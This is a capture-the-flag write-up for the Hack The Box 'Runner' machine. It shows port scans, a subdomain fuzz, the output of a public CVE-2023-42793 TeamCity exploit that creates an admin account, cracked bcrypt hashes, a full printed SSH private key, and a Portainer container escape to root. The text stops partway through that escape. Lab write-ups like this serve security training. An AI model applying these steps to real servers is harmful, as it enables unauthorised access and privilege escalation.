#HacktheBox 

Scanning for open ports 

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 19:54 IST
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 17.77 seconds
```

Running Full Nmap scan:

```bash
sudo nmap -sC -sV -p22,80,8000 10.10.11.13 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 19:55 IST
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.22s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds
```



Now doing subdomain enum

```bash
cewl --lowercase -w runnercustom http://runner.htb
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

```bash
ffuf -u http://10.10.11.13 -w runnercustom -H "Host: FUZZ.runner.htb" -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.13
 :: Wordlist         : FUZZ: /home/mindflare/Desktop/HTB/Runner/runnercustom
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 464ms]
:: Progress: [247/247] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```


Here i get 1 subdomain and after that i add it in my host file.
![](images/Pasted%20image%2020240611200526.png)

Here after searching i found exploit for this  CVE 2023-42793.

```bash
python3 51884.py -u http://teamcity.runner.htb

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *   
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.dUFzbVVlaE9zZjV4V3lzMmc5Qy14NVA4cXNV.ZjIwNjZkNzItNGI1Mi00ZDJmLWE5ZjYtMDI2OTEyNTU0ZjI5
Successfully exploited!
URL: http://teamcity.runner.htb
Username: city_adminPcpJ
Password: Main_password!!**

```

Here we can see we get credentials so using this cred lets login.

![](images/Pasted%20image%2020240611202820.png)

Here we see two users john and Matthew and we also see backup file so here i download the backup file .

```bash
sudo cat users                                           
[sudo] password for mindflare: 
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1718116740344, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, city_adminpcpj, $2a$07$Yt1uVqSQvqgt2KYEpTZhbOSeO8qjJTasL5NsHXbAwef4uObTMq43u, , angry-admin@funnybunny.org, 1718116763773, BCRYPT
```

Here i get the hash password of both and users.

Then i try to crack those hashes for both john and Matthew but i only able to crack Matthew pass.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?)     
1g 0:00:02:06 DONE (2024-06-11 21:24) 0.007881g/s 410.1p/s 410.1c/s 410.1C/s playboy93..peaches21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Matthew pass - piper123

I try to login through Matthew cred by ssh but failed.

Here after more enumeration i get id_rsa 

```powershell
/home/mindflare/Desktop/HTB/Runner/config/projects/AllProjects/pluginData/ssh_keys
```

```bash
sudo cat id_rsa
[sudo] password for mindflare: 
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----

```

After that i tried both john and Matthew to login through id_rsa but seems like john worked!

```bash
 sudo ssh -i id_rsa john@runner.htb
The authenticity of host 'runner.htb (10.10.11.13)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'runner.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Jun 11 03:13:38 PM UTC 2024

  System load:                      0.1435546875
  Usage of /:                       82.6% of 9.74GB
  Memory usage:                     46%
  Swap usage:                       0%
  Processes:                        222
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.13
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:276b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

john@runner:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

Here i get user.txt .

Prev Esc:

here i run linpeas in the user and i get the list of active ports:

![](images/Pasted%20image%2020240611213203.png)

Here after that i run netstat to check for active listening ports

Here i find that port 5005 and 9443 got nothing interesting but there was a Portainer service running on port 9000

So i port forwarded it starting a new ssh session from my device:

```bash
sudo ssh -i id_rsa john@10.10.11.13 -L 9000:127.0.0.1:9000
```

And when I checked it on my local machine browser I managed to get the Portainer login page.

Here there is an login page using Matthew cred i successfully login .

I found that the version of Portainer is 2.19.4, which is vulnerable. Also, there were two images are installed, which means I probably can add new containers on this system to run with these images.

![](images/Pasted%20image%2020240611223106.png)

Here i use ubuntu image as teamcity didnot have root prev.

Copy the ubuntu id 

```bash
sha256:ca2b0f26964cf2e80ba3e084d5983dab293fdb87485dc6445f3f7bbfc89d7459
```

then i create a new volume :

![](images/Pasted%20image%2020240611223731.png)

After creating a new volume , i create a new container.

![](images/Pasted%20image%2020240611223840.png)

Select  Interactive + tty
![](images/Pasted%20image%2020240611223933.png)

In volume part Enter the path

![](images/Pasted%20image%2020240611224025.png)

After that deploy it.

![](images/Pasted%20image%2020240611224114.png)

Here we can see our container is running click on the container and click on console and connect.

![](images/Pasted%20image%2020240611224549.png)
